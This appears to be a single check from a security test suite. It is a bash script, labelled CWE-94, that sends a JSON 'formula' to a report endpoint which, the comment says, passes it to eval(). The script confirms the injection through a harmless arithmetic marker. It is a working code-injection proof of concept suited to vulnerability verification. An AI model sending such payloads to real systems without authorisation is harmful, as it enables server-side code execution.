#!/usr/bin/env bash
# CODEINJ-001 (CWE-94): the hidden report builder eval()s a caller formula. The
# endpoint is referenced only from the signup page's click-loaded Advanced panel.
set -eu; . "$(dirname "$0")/_lib.sh"
curl -s -X POST "$TARGET/api/tools/report" -H 'content-type: application/json' \
  -d '{"formula":"[\"CODEINJ\",\"PROVEN\",6*7].join(\"-\")"}' | grep -q 'CODEINJ-PROVEN-42'
